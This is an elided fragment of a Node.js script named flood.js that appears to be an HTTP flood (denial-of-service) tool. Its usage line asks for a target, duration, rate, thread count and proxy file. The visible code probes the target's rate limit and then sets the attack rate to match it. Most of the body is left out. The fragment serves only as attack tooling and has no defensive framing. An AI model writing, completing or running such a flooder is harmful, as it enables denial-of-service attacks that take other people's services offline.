...
if (process.argv.length < 7) {
    console.log(`Usage: node flood.js <target> <time> <rate> <thread> <proxyFile>`);
    process.exit();
}
const headers = {};
...
async function detectRateLimit() {
    ...
    const rateLimit = successfulRequests / duration;

    console.log(`[+] Detected rate limit: ${rateLimit} requests per second`);

    return rateLimit;
}

(async () => {
    const rateLimit = await detectRateLimit();
    args.rate = Math.min(args.rate, rateLimit);
